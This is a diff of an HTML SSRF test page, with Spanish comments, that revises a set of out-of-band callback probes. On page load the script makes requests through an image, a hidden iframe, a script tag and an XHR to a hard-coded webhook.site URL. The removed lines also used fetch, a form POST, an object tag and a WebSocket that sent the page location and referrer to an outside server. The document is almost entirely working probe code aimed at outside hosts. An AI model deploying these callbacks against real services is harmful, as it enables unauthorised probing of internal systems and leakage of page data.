@@ -1,71 +1,43 @@
+<!DOCTYPE html>
 <html>
 <head>
-  <title>SSRF Webhook Test v2</title>
+  <title>SSRF Test Revisado</title>
 </head>
 <body>
   <script>
-  window.onload = function() {
-    const webhookUrl = 'https://webhook.site/7cdc61db-d2f3-4e50-aab4-9744f57a2a32';
-    
-    // Intento 1: Fetch con modo no-cors
-    fetch(webhookUrl + '?source=fetch_nocors', {
-      mode: 'no-cors',
-      method: 'GET',
-      credentials: 'omit'
-    }).catch(error => console.error('Fetch error:', error));
+    window.onload = function() {
+      const webhookUrl = 'https://webhook.site/7cdc61db-d2f3-4e50-aab4-9744f57a2a32';
 
-    // Intento 2: WebSocket seguro
-    try {
-      const ws = new WebSocket('wss://echo.websocket.org');
-      ws.onopen = () => {
-        ws.send(JSON.stringify({
-          source: 'websocket_secure',
-          location: window.location.href,
-          referrer: document.referrer
-        }));
+      // Intento 1: Usando Image
+      const img = new Image();
+      img.onload = () => console.log('Imagen cargada exitosamente');
+      img.onerror = () => console.log('Error al cargar la imagen (esto es normal)');
+      img.src = webhookUrl + '?source=img_tag&time=' + Date.now();
+
+      // Intento 2: Usando iframe
+      const iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      iframe.src = webhookUrl + '?source=iframe&time=' + Date.now();
+      document.body.appendChild(iframe);
+
+      // Intento 3: Usando script tag
+      const script = document.createElement('script');
+      script.src = webhookUrl + '?source=script_tag&time=' + Date.now();
+      document.body.appendChild(script);
+
+      // Intento 4: Usando XMLHttpRequest (fallará debido a CORS, pero intentémoslo)
+      var xhr = new XMLHttpRequest();
+      xhr.open('GET', webhookUrl + '?source=xhr&time=' + Date.now(), true);
+      xhr.onload = function() {
+        console.log('XHR respuesta:', xhr.responseText);
       };
-    } catch(e) {
-      console.error('WebSocket error:', e);
-    }
-
-    // Intento 3: Usando Image
-    const img = new Image();
-    img.src = webhookUrl + '?source=img_tag&time=' + Date.now();
-    
-    // Intento 4: Dynamic Script Injection
-    const script = document.createElement('script');
-    script.src = webhookUrl + '?source=script_tag&time=' + Date.now();
-    document.body.appendChild(script);
-
-    // Intento 5: Using iframe dentro de otro iframe
-    const iframe = document.createElement('iframe');
-    iframe.src = webhookUrl + '?source=iframe_nested&time=' + Date.now();
-    document.body.appendChild(iframe);
-
-    // Intento 6: EventSource
-    try {
-      const evtSource = new EventSource(webhookUrl + '?source=eventsource');
-      evtSource.onmessage = function(e) {
-        console.log('EventSource message:', e.data);
+      xhr.onerror = function() {
+        console.log('XHR error (esto es esperado debido a CORS)');
       };
-    } catch(e) {
-      console.error('EventSource error:', e);
-    }
+      xhr.send();
 
-    // Intento 7: Usando form post
-    const form = document.createElement('form');
-    form.method = 'POST';
-    form.action = webhookUrl;
-    const input = document.createElement('input');
-    input.type = 'hidden';
-    input.name = 'source';
-    input.value = 'form_post';
-    form.appendChild(input);
-    document.body.appendChild(form);
-    form.submit();
-  }
+      console.log('Intentos de conexión realizados. Verifica tu webhook para ver si se registraron las solicitudes.');
+    }
   </script>
-  <!-- Intento 8: Using object tag -->
-  <object data="${webhookUrl}?source=object_tag" type="text/html"></object>
 </body>
 </html>
